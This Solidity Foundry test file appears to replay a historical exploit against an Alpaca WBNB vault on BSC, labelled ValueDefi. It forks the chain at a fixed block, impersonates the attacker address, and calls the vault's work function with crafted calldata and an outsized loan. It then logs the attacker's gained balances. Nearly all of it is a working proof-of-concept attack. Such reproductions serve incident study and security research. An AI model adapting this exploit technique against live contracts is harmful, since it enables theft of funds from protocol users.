// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    Attack tx: https://bscscan.com/tx/0xa00def91954ba9f1a1320ef582420d41ca886d417d996362bf3ac3fe2bfb9006
    Tenderly.co: https://dashboard.tenderly.co/tx/bsc/0xa00def91954ba9f1a1320ef582420d41ca886d417d996362bf3ac3fe2bfb9006/
    Debug transaction: https://phalcon.blocksec.com/tx/bsc/0xa00def91954ba9f1a1320ef582420d41ca886d417d996362bf3ac3fe2bfb9006
    
    run: forge test --contracts ./src/test/ValueDefi_exp.sol -vvv  */

interface AlpacaWBNBVault {
    function work(
        uint256 id,
        address worker,
        uint256 principalAmount,
        uint256 loan,
        uint256 maxReturn,
        bytes calldata data
    ) external payable;
}

contract ContractTest is Test {
    AlpacaWBNBVault vault = AlpacaWBNBVault(0xd7D069493685A581d27824Fc46EdA46B7EfC0063);
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 vSafeVaultWBNB = IERC20(payable(0xD4BBF439d3EAb5155Ca7c0537E583088fB4CFCe8));
    address attacker = address(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);
    address attackerContract = address(0x4269e4090FF9dFc99D8846eB0D42E67F01C3AC8b);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 7_223_029); //fork bsc at block 7223029
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB Balance of attacker", wbnb.balanceOf(attacker), 18);

        bytes memory data =
            hex"000000000000000000000000e38ebfe8f314dcad61d5adcb29c1a26f41bed0be00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000060000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0000000000000000000000004269e4090ff9dfc99d8846eb0d42e67f01c3ac8b0000000000000000000000000000000000000000000000000000000000000000";

        cheats.startPrank(0xCB36b1ee0Af68Dce5578a487fF2Da81282512233, 0xCB36b1ee0Af68Dce5578a487fF2Da81282512233);

        vault.work{value: 1 ether}(
            0,
            0x7Af938f0EFDD98Dc513109F6A7E85106D26E16c4,
            1_000_000_000_000_000_000,
            393_652_744_565_353_082_751_500,
            1_000_000_000_000_000_000_000_000,
            data
        );

        emit log_named_decimal_uint("[End] WBNB balance of attacker after exploit", wbnb.balanceOf(attacker), 18);

        emit log_named_decimal_uint(
            "[End] Attacker vSafeWBNB balance after exploit", vSafeVaultWBNB.balanceOf(attacker), 18
        );
    }
}
